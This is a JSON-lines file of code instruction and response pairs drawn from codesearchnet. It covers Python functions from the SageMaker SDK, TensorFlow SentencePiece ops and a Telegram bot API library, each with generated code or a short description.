{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates and deploy an endpoint using existing model data stored in S3.", "response": "def endpoint_from_model_data(self, model_s3_location, deployment_image, initial_instance_count, instance_type,\n                                 name=None, role=None, wait=True, model_environment_vars=None, model_vpc_config=None,\n                                 accelerator_type=None):\n        \"\"\"Create and deploy to an ``Endpoint`` using existing model data stored in S3.\n\n        Args:\n            model_s3_location (str): S3 URI of the model artifacts to use for the endpoint.\n            deployment_image (str): The Docker image which defines the runtime code to be used as\n                the entry point for accepting prediction requests.\n            initial_instance_count (int): Minimum number of EC2 instances to launch. The actual number of\n                active instances for an endpoint at any given time varies due to autoscaling.\n            instance_type (str): Type of EC2 instance to deploy to an endpoint for prediction, e.g. 'ml.c4.xlarge'.\n            name (str): Name of the ``Endpoint`` to create. If not specified, uses a name generated by\n                combining the image name with a timestamp.\n            role (str): An AWS IAM role (either name or full ARN). The Amazon SageMaker training jobs and APIs\n                that create Amazon SageMaker endpoints use this role to access training data and model artifacts.\n                You must grant sufficient permissions to this role.\n            wait (bool): Whether to wait for the endpoint deployment to complete before returning (default: True).\n            model_environment_vars (dict[str, str]): Environment variables to set on the model container\n                (default: None).\n            model_vpc_config (dict[str, list[str]]): The VpcConfig set on the model (default: None)\n                * 'Subnets' (list[str]): List of subnet ids.\n                * 'SecurityGroupIds' (list[str]): List of security group ids.\n            accelerator_type (str): Type of Elastic Inference accelerator to attach to the instance. For example,\n                'ml.eia1.medium'. For more information: https://docs.aws.amazon.com/sagemaker/latest/dg/ei.html\n\n        Returns:\n            str: Name of the ``Endpoint`` that is created.\n        \"\"\"\n\n        model_environment_vars = model_environment_vars or {}\n        name = name or name_from_image(deployment_image)\n        model_vpc_config = vpc_utils.sanitize(model_vpc_config)\n\n        if _deployment_entity_exists(lambda: self.sagemaker_client.describe_endpoint(EndpointName=name)):\n            raise ValueError('Endpoint with name \"{}\" already exists; please pick a different name.'.format(name))\n\n        if not _deployment_entity_exists(lambda: self.sagemaker_client.describe_model(ModelName=name)):\n            primary_container = container_def(image=deployment_image,\n                                              model_data_url=model_s3_location,\n                                              env=model_environment_vars)\n            self.create_model(name=name,\n                              role=role,\n                              container_defs=primary_container,\n                              vpc_config=model_vpc_config)\n\n        if not _deployment_entity_exists(\n                lambda: self.sagemaker_client.describe_endpoint_config(EndpointConfigName=name)):\n            self.create_endpoint_config(name=name,\n                                        model_name=name,\n                                        initial_instance_count=initial_instance_count,\n                                        instance_type=instance_type,\n                                        accelerator_type=accelerator_type)\n\n        self.create_endpoint(endpoint_name=name, config_name=name, wait=wait)\n        return name"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef endpoint_from_production_variants(self, name, production_variants, tags=None, kms_key=None, wait=True):\n\n        if not _deployment_entity_exists(\n                lambda: self.sagemaker_client.describe_endpoint_config(EndpointConfigName=name)):\n            config_options = {'EndpointConfigName': name, 'ProductionVariants': production_variants}\n            if tags:\n                config_options['Tags'] = tags\n            if kms_key:\n                config_options['KmsKeyId'] = kms_key\n\n            self.sagemaker_client.create_endpoint_config(**config_options)\n        return self.create_endpoint(endpoint_name=name, config_name=name, tags=tags, wait=wait)", "response": "Create an SageMaker Endpoint from a list of production variants."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nexpands an IAM role name into an ARN.", "response": "def expand_role(self, role):\n        \"\"\"Expand an IAM role name into an ARN.\n\n        If the role is already in the form of an ARN, then the role is simply returned. Otherwise we retrieve the full\n        ARN and return it.\n\n        Args:\n            role (str): An AWS IAM role (either name or full ARN).\n\n        Returns:\n            str: The corresponding AWS IAM role ARN.\n        \"\"\"\n        if '/' in role:\n            return role\n        else:\n            return self.boto_session.resource('iam').Role(role).arn"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_caller_identity_arn(self):\n        assumed_role = self.boto_session.client('sts').get_caller_identity()['Arn']\n\n        if 'AmazonSageMaker-ExecutionRole' in assumed_role:\n            role = re.sub(r'^(.+)sts::(\\d+):assumed-role/(.+?)/.*$', r'\\1iam::\\2:role/service-role/\\3', assumed_role)\n            return role\n\n        role = re.sub(r'^(.+)sts::(\\d+):assumed-role/(.+?)/.*$', r'\\1iam::\\2:role/\\3', assumed_role)\n\n        # Call IAM to get the role's path\n        role_name = role[role.rfind('/') + 1:]\n        try:\n            role = self.boto_session.client('iam').get_role(RoleName=role_name)['Role']['Arn']\n        except ClientError:\n            LOGGER.warning(\"Couldn't call 'get_role' to get Role ARN from role name {} to get Role path.\"\n                           .format(role_name))\n\n        return role", "response": "Returns the ARN user or role whose credentials are used to call the API."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ndisplaying the logs for a given training job.", "response": "def logs_for_job(self, job_name, wait=False, poll=10):  # noqa: C901 - suppress complexity warning for this method\n        \"\"\"Display the logs for a given training job, optionally tailing them until the\n        job is complete. If the output is a tty or a Jupyter cell, it will be color-coded\n        based on which instance the log entry is from.\n\n        Args:\n            job_name (str): Name of the training job to display the logs for.\n            wait (bool): Whether to keep looking for new log entries until the job completes (default: False).\n            poll (int): The interval in seconds between polling for new log entries and job completion (default: 5).\n\n        Raises:\n            ValueError: If waiting and the training job fails.\n        \"\"\"\n\n        description = self.sagemaker_client.describe_training_job(TrainingJobName=job_name)\n        print(secondary_training_status_message(description, None), end='')\n        instance_count = description['ResourceConfig']['InstanceCount']\n        status = description['TrainingJobStatus']\n\n        stream_names = []  # The list of log streams\n        positions = {}     # The current position in each stream, map of stream name -> position\n\n        # Increase retries allowed (from default of 4), as we don't want waiting for a training job\n        # to be interrupted by a transient exception.\n        config = botocore.config.Config(retries={'max_attempts': 15})\n        client = self.boto_session.client('logs', config=config)\n        log_group = '/aws/sagemaker/TrainingJobs'\n\n        job_already_completed = True if status == 'Completed' or status == 'Failed' or status == 'Stopped' else False\n\n        state = LogState.TAILING if wait and not job_already_completed else LogState.COMPLETE\n        dot = False\n\n        color_wrap = sagemaker.logs.ColorWrap()\n\n        # The loop below implements a state machine that alternates between checking the job status and\n        # reading whatever is available in the logs at this point. Note, that if we were called with\n        # wait == False, we never check the job status.\n        #\n        # If wait == TRUE and job is not completed, the initial state is TAILING\n        # If wait == FALSE, the initial state is COMPLETE (doesn't matter if the job really is complete).\n        #\n        # The state table:\n        #\n        # STATE               ACTIONS                        CONDITION             NEW STATE\n        # ----------------    ----------------               -----------------     ----------------\n        # TAILING             Read logs, Pause, Get status   Job complete          JOB_COMPLETE\n        #                                                    Else                  TAILING\n        # JOB_COMPLETE        Read logs, Pause               Any                   COMPLETE\n        # COMPLETE            Read logs, Exit                                      N/A\n        #\n        # Notes:\n        # - The JOB_COMPLETE state forces us to do an extra pause and read any items that got to Cloudwatch after\n        #   the job was marked complete.\n        last_describe_job_call = time.time()\n        last_description = description\n        while True:\n            if len(stream_names) < instance_count:\n                # Log streams are created whenever a container starts writing to stdout/err, so this list\n                # may be dynamic until we have a stream for every instance.\n                try:\n                    streams = client.describe_log_streams(logGroupName=log_group, logStreamNamePrefix=job_name + '/',\n                                                          orderBy='LogStreamName', limit=instance_count)\n                    stream_names = [s['logStreamName'] for s in streams['logStreams']]\n                    positions.update([(s, sagemaker.logs.Position(timestamp=0, skip=0))\n                                      for s in stream_names if s not in positions])\n                except ClientError as e:\n                    # On the very first training job run on an account, there's no log group until\n                    # the container starts logging, so ignore any errors thrown about that\n                    err = e.response.get('Error', {})\n                    if err.get('Code', None) != 'ResourceNotFoundException':\n                        raise\n\n            if len(stream_names) > 0:\n                if dot:\n                    print('')\n                    dot = False\n                for idx, event in sagemaker.logs.multi_stream_iter(client, log_group, stream_names, positions):\n                    color_wrap(idx, event['message'])\n                    ts, count = positions[stream_names[idx]]\n                    if event['timestamp'] == ts:\n                        positions[stream_names[idx]] = sagemaker.logs.Position(timestamp=ts, skip=count + 1)\n                    else:\n                        positions[stream_names[idx]] = sagemaker.logs.Position(timestamp=event['timestamp'], skip=1)\n            else:\n                dot = True\n                print('.', end='')\n                sys.stdout.flush()\n            if state == LogState.COMPLETE:\n                break\n\n            time.sleep(poll)\n\n            if state == LogState.JOB_COMPLETE:\n                state = LogState.COMPLETE\n            elif time.time() - last_describe_job_call >= 30:\n                description = self.sagemaker_client.describe_training_job(TrainingJobName=job_name)\n                last_describe_job_call = time.time()\n\n                if secondary_training_status_changed(description, last_description):\n                    print()\n                    print(secondary_training_status_message(description, last_description), end='')\n                    last_description = description\n\n                status = description['TrainingJobStatus']\n\n                if status == 'Completed' or status == 'Failed' or status == 'Stopped':\n                    print()\n                    state = LogState.JOB_COMPLETE\n\n        if wait:\n            self._check_job_status(job_name, description, 'TrainingJobStatus')\n            if dot:\n                print()\n            # Customers are not billed for hardware provisioning, so billable time is less than total time\n            billable_time = (description['TrainingEndTime'] - description['TrainingStartTime']) * instance_count\n            print('Billable seconds:', int(billable_time.total_seconds()) + 1)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef registry(region_name, framework=None):\n    try:\n        account_id = image_registry_map[region_name][framework]\n        return get_ecr_image_uri_prefix(account_id, region_name)\n    except KeyError:\n        logging.error(\"The specific image or region does not exist\")\n        raise", "response": "Returns the docker registry for the given AWS region."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncreate a KNNModel referencing the latest KNN .", "response": "def create_model(self, vpc_config_override=VPC_CONFIG_DEFAULT):\n        \"\"\"Return a :class:`~sagemaker.amazon.KNNModel` referencing the latest\n        s3 model data produced by this Estimator.\n\n        Args:\n            vpc_config_override (dict[str, list[str]]): Optional override for VpcConfig set on the model.\n                Default: use subnets and security groups from this Estimator.\n                * 'Subnets' (list[str]): List of subnet ids.\n                * 'SecurityGroupIds' (list[str]): List of security group ids.\n        \"\"\"\n        return KNNModel(self.model_data, self.role, sagemaker_session=self.sagemaker_session,\n                        vpc_config=self.get_vpc_config(vpc_config_override))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef copy_directory_structure(destination_directory, relative_path):\n    full_path = os.path.join(destination_directory, relative_path)\n    if os.path.exists(full_path):\n        return\n\n    os.makedirs(destination_directory, relative_path)", "response": "Create all the intermediate directories required for relative_path to exist within destination_directory."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef move_to_destination(source, destination, job_name, sagemaker_session):\n    parsed_uri = urlparse(destination)\n    if parsed_uri.scheme == 'file':\n        recursive_copy(source, parsed_uri.path)\n        final_uri = destination\n    elif parsed_uri.scheme == 's3':\n        bucket = parsed_uri.netloc\n        path = \"%s%s\" % (parsed_uri.path.lstrip('/'), job_name)\n        final_uri = 's3://%s/%s' % (bucket, path)\n        sagemaker_session.upload_data(source, bucket, path)\n    else:\n        raise ValueError('Invalid destination URI, must be s3:// or file://, got: %s' % destination)\n\n    shutil.rmtree(source)\n    return final_uri", "response": "Move source to destination. Can handle uploading to S3 or file"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef recursive_copy(source, destination):\n    if os.path.isdir(source):\n        copy_tree(source, destination)", "response": "A wrapper around distutils. dir_util. copy_tree but won t throw any exception when the source\n    directory does not exist."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nconverting the job description to init params that can be handled by the class constructor.", "response": "def _prepare_init_params_from_job_description(cls, job_details, model_channel_name=None):\n        \"\"\"Convert the job description to init params that can be handled by the class constructor\n\n        Args:\n            job_details: the returned job details from a describe_training_job API call.\n            model_channel_name (str): Name of the channel where pre-trained model data will be downloaded.\n\n        Returns:\n            dictionary: The transformed init_params\n\n        \"\"\"\n        init_params = super(MXNet, cls)._prepare_init_params_from_job_description(job_details, model_channel_name)\n        image_name = init_params.pop('image')\n        framework, py_version, tag, _ = framework_name_from_image(image_name)\n\n        if not framework:\n            # If we were unable to parse the framework name from the image it is not one of our\n            # officially supported images, in this case just add the image to the init params.\n            init_params['image_name'] = image_name\n            return init_params\n\n        init_params['py_version'] = py_version\n\n        # We switched image tagging scheme from regular image version (e.g. '1.0') to more expressive\n        # containing framework version, device type and python version (e.g. '0.12-gpu-py2').\n        # For backward compatibility map deprecated image tag '1.0' to a '0.12' framework version\n        # otherwise extract framework version from the tag itself.\n        init_params['framework_version'] = '0.12' if tag == '1.0' else framework_version_from_tag(tag)\n\n        training_job_name = init_params['base_job_name']\n\n        if framework != cls.__framework_name__:\n            raise ValueError(\"Training job: {} didn't use image for requested framework\".format(training_job_name))\n\n        return init_params"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nstart a new transform job.", "response": "def transform(self, data, data_type='S3Prefix', content_type=None, compression_type=None, split_type=None,\n                  job_name=None):\n        \"\"\"Start a new transform job.\n\n        Args:\n            data (str): Input data location in S3.\n            data_type (str): What the S3 location defines (default: 'S3Prefix'). Valid values:\n\n                * 'S3Prefix' - the S3 URI defines a key name prefix. All objects with this prefix will be used as\n                    inputs for the transform job.\n                * 'ManifestFile' - the S3 URI points to a single manifest file listing each S3 object to use as\n                    an input for the transform job.\n\n            content_type (str): MIME type of the input data (default: None).\n            compression_type (str): Compression type of the input data, if compressed (default: None).\n                Valid values: 'Gzip', None.\n            split_type (str): The record delimiter for the input object (default: 'None').\n                Valid values: 'None', 'Line', 'RecordIO', and 'TFRecord'.\n            job_name (str): job name (default: None). If not specified, one will be generated.\n        \"\"\"\n        local_mode = self.sagemaker_session.local_mode\n        if not local_mode and not data.startswith('s3://'):\n            raise ValueError('Invalid S3 URI: {}'.format(data))\n\n        if job_name is not None:\n            self._current_job_name = job_name\n        else:\n            base_name = self.base_transform_job_name or base_name_from_image(self._retrieve_image_name())\n            self._current_job_name = name_from_base(base_name)\n\n        if self.output_path is None:\n            self.output_path = 's3://{}/{}'.format(self.sagemaker_session.default_bucket(), self._current_job_name)\n\n        self.latest_transform_job = _TransformJob.start_new(self, data, data_type, content_type, compression_type,\n                                                            split_type)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nattach an existing transform job to a new Transformer instance.", "response": "def attach(cls, transform_job_name, sagemaker_session=None):\n        \"\"\"Attach an existing transform job to a new Transformer instance\n\n        Args:\n            transform_job_name (str): Name for the transform job to be attached.\n            sagemaker_session (sagemaker.session.Session): Session object which manages interactions with\n                Amazon SageMaker APIs and any other AWS services needed. If not specified, one will be created\n                using the default AWS configuration chain.\n\n        Returns:\n            sagemaker.transformer.Transformer: The Transformer instance with the specified transform job attached.\n\n        \"\"\"\n        sagemaker_session = sagemaker_session or Session()\n\n        job_details = sagemaker_session.sagemaker_client.describe_transform_job(TransformJobName=transform_job_name)\n        init_params = cls._prepare_init_params_from_job_description(job_details)\n        transformer = cls(sagemaker_session=sagemaker_session, **init_params)\n        transformer.latest_transform_job = _TransformJob(sagemaker_session=sagemaker_session,\n                                                         job_name=init_params['base_transform_job_name'])\n\n        return transformer"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _prepare_init_params_from_job_description(cls, job_details):\n        init_params = dict()\n\n        init_params['model_name'] = job_details['ModelName']\n        init_params['instance_count'] = job_details['TransformResources']['InstanceCount']\n        init_params['instance_type'] = job_details['TransformResources']['InstanceType']\n        init_params['volume_kms_key'] = job_details['TransformResources'].get('VolumeKmsKeyId')\n        init_params['strategy'] = job_details.get('BatchStrategy')\n        init_params['assemble_with'] = job_details['TransformOutput'].get('AssembleWith')\n        init_params['output_path'] = job_details['TransformOutput']['S3OutputPath']\n        init_params['output_kms_key'] = job_details['TransformOutput'].get('KmsKeyId')\n        init_params['accept'] = job_details['TransformOutput'].get('Accept')\n        init_params['max_concurrent_transforms'] = job_details.get('MaxConcurrentTransforms')\n        init_params['max_payload'] = job_details.get('MaxPayloadInMB')\n        init_params['base_transform_job_name'] = job_details['TransformJobName']\n\n        return init_params", "response": "Convert the transform job description to init params that can be handled by the class constructor."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef piece_size(model_file=None, model_proto=None, name=None):\n\n  return _gen_sentencepiece_processor_op.sentencepiece_get_piece_size(\n      model_file=model_file, model_proto=model_proto, name=name)", "response": "Returns the piece size."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef piece_to_id(input, model_file=None, model_proto=None, name=None):\n\n  return _gen_sentencepiece_processor_op.sentencepiece_piece_to_id(\n      input, model_file=model_file, model_proto=model_proto, name=name)", "response": "Converts a piece into vocabulary id."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef id_to_piece(input, model_file=None, model_proto=None, name=None):\n\n  return _gen_sentencepiece_processor_op.sentencepiece_id_to_piece(\n      input, model_file=model_file, model_proto=model_proto, name=name)", "response": "Converts vocabulary id into piece."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef is_unknown(input, model_file=None, model_proto=None, name=None):\n\n  return _gen_sentencepiece_processor_op.sentencepiece_get_piece_type(\n      input, model_file=model_file, model_proto=model_proto, name=name,\n      piece_type=0)", "response": "Returns true if input id is unknown piece."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef is_control(input, model_file=None, model_proto=None, name=None):\n\n  return _gen_sentencepiece_processor_op.sentencepiece_get_piece_type(\n      input, model_file=model_file, model_proto=model_proto, name=name,\n      piece_type=1)", "response": "Returns true if input id is control piece."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef is_unused(input, model_file=None, model_proto=None, name=None):\n\n  return _gen_sentencepiece_processor_op.sentencepiece_get_piece_type(\n      input, model_file=model_file, model_proto=model_proto, name=name,\n      piece_type=2)", "response": "Returns true if input id is unused piece."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef encode_dense(input_sentences, nbest_size=0, alpha=1.0,\n                 model_file=None, model_proto=None,\n                 reverse=False, add_bos=False, add_eos=False,\n                 out_type=tf.int32, name=None):\n  \"\"\"Encodes sentences into pieces in dense tensor format.\n\n  Args:\n    input_sentences: A 1D string tensor of arbitrary size holding the raw\n                     text of input sentences.\n    nbest_size: A scalar or 1D tensor for sampling.\n                nbest_size = {0,1}: No sampling is performed.\n                nbest_size > 1: samples from the nbest_size results.\n                nbest_size < 0: assuming that nbest_size is infinite\n                and samples from the all hypothesis (lattice) using\n                forward-filtering-and-backward-sampling algorithm.\n    alpha: A scalar or 1D tensor for a smoothing parameter.\n           Inverse temperature for probability rescaling.\n    model_file: The sentencepiece model file path.\n    model_proto: The sentencepiece model serialized proto.\n                 Either `model_file` or `model_proto` must be set.\n    reverse: Reverses the tokenized sequence (Default = false)\n    add_bos: Add <s> to the result (Default = false)\n    add_eos: Add </s> to the result (Default = false)\n             <s>/</s> is added after reversing (if enabled).\n    out_type: output type. tf.int32 or tf.string (Default = tf.int32)\n              Setting tf.int32 directly encodes the string into an id sequence.\n    name: The name argument that is passed to the op function.\n  Returns:\n    pieces: A dense 2D tensor representing the tokenized sentences.\n    sequence_length: A 1D tensor representing the length of pieces.\n  \"\"\"\n\n  return _gen_sentencepiece_processor_op.sentencepiece_encode_dense(\n      input_sentences, nbest_size=nbest_size, alpha=alpha,\n      model_file=model_file, model_proto=model_proto,\n      reverse=reverse, add_bos=add_bos, add_eos=add_eos,\n      out_type=out_type, name=name)", "response": "Encodes sentences into pieces in dense format."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nencoding sentences into pieces in sparse tensor format.", "response": "def encode_sparse(input_sentences, nbest_size=0, alpha=1.0,\n                  model_file=None, model_proto=None,\n                  reverse=False, add_bos=False, add_eos=False,\n                  out_type=tf.int32, name=None):\n  \"\"\"Encodes sentences into pieces in sparse tensor format.\n\n  Args:\n    input_sentences: A 1D string tensor of arbitrary size holding the raw\n                     text of input sentences.\n    nbest_size: A scalar or 1D tensor for sampling.\n                nbest_size = {0,1}: No sampling is performed.\n                nbest_size > 1: samples from the nbest_size results.\n                nbest_size < 0: assuming that nbest_size is infinite\n                and samples from the all hypothesis (lattice) using\n                forward-filtering-and-backward-sampling algorithm.\n    alpha: A scalar or 1D tensor for a smoothing parameter.\n           Inverse temperature for probability rescaling.\n    model_file: The sentencepiece model file path.\n    model_proto: The sentencepiece model serialized proto.\n                 Either `model_file` or `model_proto` must be set.\n    reverse: Reverses the tokenized sequence (Default = false)\n    add_bos: Add <s> to the result (Default = false)\n    add_eos: Add </s> to the result (Default = false)\n             <s>/</s> is added after reversing (if enabled).\n    out_type: output type. tf.int32 or tf.string (Default = tf.int32)\n              Setting tf.int32 directly encodes the string into an id sequence.\n    name: The name argument that is passed to the op function.\n\n  Returns:\n    pieces: A sparse 2D tensor representing the tokenized sentences.\n  \"\"\"\n\n  indices, values, dense_shape = (\n      _gen_sentencepiece_processor_op.sentencepiece_encode_sparse(\n          input_sentences, nbest_size=nbest_size, alpha=alpha,\n          model_file=model_file, model_proto=model_proto,\n          reverse=reverse, add_bos=add_bos, add_eos=add_eos,\n          out_type=out_type, name=name))\n  return tf.SparseTensor(indices, values, dense_shape)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ndecode pieces into postprocessed text.", "response": "def decode(pieces, sequence_length, model_file=None, model_proto=None,\n           reverse=False, name=None):\n  \"\"\"Decode pieces into postprocessed text.\n\n  Args:\n    pieces: A 2D int32 or string tensor [batch_size x max_length] of\n            encoded sequences.\n    sequence_length: A 1D int32 tensor [batch_size] representing the\n                   length of pieces.\n    model_file: The sentencepiece model file path.\n    model_proto: The sentencepiece model serialized proto.\n                 Either `model_file` or `model_proto` must be set.\n    reverse: Reverses the tokenized sequence (Default = false)\n    name: The name argument that is passed to the op function.\n\n  Returns:\n    text: A 1D string tensor of decoded string.\n  \"\"\"\n\n  return _gen_sentencepiece_processor_op.sentencepiece_decode(\n      pieces, sequence_length, model_file=model_file,\n      model_proto=model_proto, reverse=reverse, name=name)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef split_string(text, chars_per_string):\n    return [text[i:i + chars_per_string] for i in range(0, len(text), chars_per_string)]", "response": "Splits one string into multiple strings with a maximum amount of chars_per_string characters per string."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef extract_arguments(text):\n    regexp = re.compile(\"/\\w*(@\\w*)*\\s*([\\s\\S]*)\",re.IGNORECASE)\n    result = regexp.match(text)\n    return result.group(2) if is_command(text) else None", "response": "Extracts the arguments after the command."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef check_json(json_type):\n        try:\n            str_types = (str, unicode)\n        except NameError:\n            str_types = (str,)\n\n        if type(json_type) == dict:\n            return json_type\n        elif type(json_type) in str_types:\n            return json.loads(json_type)\n        else:\n            raise ValueError(\"json_type should be a json dict or string.\")", "response": "Checks whether json_type is a dict or a string."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nparse text and add entities to the html_text attribute of the current object.", "response": "def __html_text(self, text, entities):\n        \"\"\"\n        Author: @sviat9440\n        Message: \"*Test* parse _formatting_, [url](https://example.com), [text_mention](tg://user?id=123456) and mention @username\"\n\n        Example:\n            message.html_text\n            >> \"<b>Test</b> parse <i>formatting</i>, <a href=\\\"https://example.com\\\">url</a>, <a href=\\\"tg://user?id=123456\\\">text_mention</a> and mention @username\"\n\n        Cusom subs:\n            You can customize the substitutes. By default, there is no substitute for the entities: hashtag, bot_command, email. You can add or modify substitute an existing entity.\n        Example:\n            message.custom_subs = {\"bold\": \"<strong class=\\\"example\\\">{text}</strong>\", \"italic\": \"<i class=\\\"example\\\">{text}</i>\", \"mention\": \"<a href={url}>{text}</a>\"}\n            message.html_text\n            >> \"<strong class=\\\"example\\\">Test</strong> parse <i class=\\\"example\\\">formatting</i>, <a href=\\\"https://example.com\\\">url</a> and <a href=\\\"tg://user?id=123456\\\">text_mention</a> and mention <a href=\\\"https://t.me/username\\\">@username</a>\"\n        \"\"\"\n\n        if not entities:\n            return text\n        _subs = {\n            \"bold\"     : \"<b>{text}</b>\",\n            \"italic\"   : \"<i>{text}</i>\",\n            \"pre\"      : \"<pre>{text}</pre>\",\n            \"code\"     : \"<code>{text}</code>\",\n            \"url\"      : \"<a href=\\\"{url}\\\">{text}</a>\",\n            \"text_link\": \"<a href=\\\"{url}\\\">{text}</a>\"\n        }\n        if hasattr(self, \"custom_subs\"):\n            for type in self.custom_subs:\n                _subs[type] = self.custom_subs[type]\n        utf16_text = text.encode(\"utf-16-le\")\n        html_text = \"\"\n\n        def func(text, type=None, url=None, user=None):\n            text = text.decode(\"utf-16-le\")\n            if type == \"text_mention\":\n                type = \"url\"\n                url = \"tg://user?id={0}\".format(user.id)\n            elif type == \"mention\":\n                url = \"https://t.me/{0}\".format(text[1:])\n            if not type or not _subs.get(type):\n                return text\n            subs = _subs.get(type)\n            text = text.replace(\"&\", \"&amp;\").replace(\"<\", \"&lt;\").replace(\">\", \"&gt;\")\n            return subs.format(text=text, url=url)\n\n        offset = 0\n        for entity in entities:\n            if entity.offset > offset:\n                html_text += func(utf16_text[offset * 2 : entity.offset * 2])\n                offset = entity.offset\n            html_text += func(utf16_text[offset * 2 : (offset + entity.length) * 2], entity.type, entity.url, entity.user)\n            offset += entity.length\n        if offset * 2 < len(utf16_text):\n            html_text += func(utf16_text[offset * 2:])\n        return html_text"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef to_json(self):\n        json_dict = {'keyboard': self.keyboard}\n        if self.one_time_keyboard:\n            json_dict['one_time_keyboard'] = True\n\n        if self.resize_keyboard:\n            json_dict['resize_keyboard'] = True\n\n        if self.selective:\n            json_dict['selective'] = True\n\n        return json.dumps(json_dict)", "response": "Converts this object to its json representation following the Telegram API guidelines described here."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef add(self, *args):\n        i = 1\n        row = []\n        for button in args:\n            row.append(button.to_dic())\n            if i % self.row_width == 0:\n                self.keyboard.append(row)\n                row = []\n            i += 1\n        if len(row) > 0:\n            self.keyboard.append(row)", "response": "This function adds strings to the keyboard while not exceeding row_width."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nadd a list of KeyboardButton to the keyboard. This function does not consider row_width.", "response": "def row(self, *args):\n        \"\"\"\n        Adds a list of KeyboardButton to the keyboard. This function does not consider row_width.\n        ReplyKeyboardMarkup#row(\"A\")#row(\"B\", \"C\")#to_json() outputs '{keyboard: [[\"A\"], [\"B\", \"C\"]]}'\n        See https://core.telegram.org/bots/api#inlinekeyboardmarkup\n        :param args: strings\n        :return: self, to allow function chaining.\n        \"\"\"\n        btn_array = []\n        for button in args:\n            btn_array.append(button.to_dic())\n        self.keyboard.append(btn_array)\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _make_request(token, method_name, method='get', params=None, files=None, base_url=API_URL):\n    request_url = base_url.format(token, method_name)\n    logger.debug(\"Request: method={0} url={1} params={2} files={3}\".format(method, request_url, params, files))\n    read_timeout = READ_TIMEOUT\n    connect_timeout = CONNECT_TIMEOUT\n    if files and format_header_param:\n        fields.format_header_param = _no_encode(format_header_param)\n    if params:\n        if 'timeout' in params: read_timeout = params['timeout'] + 10\n        if 'connect-timeout' in params: connect_timeout = params['connect-timeout'] + 10\n    result = _get_req_session().request(method, request_url, params=params, files=files,\n                                        timeout=(connect_timeout, read_timeout), proxies=proxy)\n    logger.debug(\"The server returned: '{0}'\".format(result.text.encode('utf8')))\n    return _check_result(method_name, result)['result']", "response": "Makes a request to the Telegram API."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncheck whether the result of a method call is a valid API response.", "response": "def _check_result(method_name, result):\n    \"\"\"\n    Checks whether `result` is a valid API response.\n    A result is considered invalid if:\n        - The server returned an HTTP response code other than 200\n        - The content of the result is invalid JSON.\n        - The method call was unsuccessful (The JSON 'ok' field equals False)\n\n    :raises ApiException: if one of the above listed cases is applicable\n    :param method_name: The name of the method called\n    :param result: The returned result of the method request\n    :return: The result parsed to a JSON dictionary.\n    \"\"\"\n    if result.status_code != 200:\n        msg = 'The server returned HTTP {0} {1}. Response body:\\n[{2}]' \\\n            .format(result.status_code, result.reason, result.text.encode('utf8'))\n        raise ApiException(msg, method_name, result)\n\n    try:\n        result_json = result.json()\n    except:\n        msg = 'The server returned an invalid JSON response. Response body:\\n[{0}]' \\\n            .format(result.text.encode('utf8'))\n        raise ApiException(msg, method_name, result)\n\n    if not result_json['ok']:\n        msg = 'Error code: {0} Description: {1}' \\\n            .format(result_json['error_code'], result_json['description'])\n        raise ApiException(msg, method_name, result)\n    return result_json"}
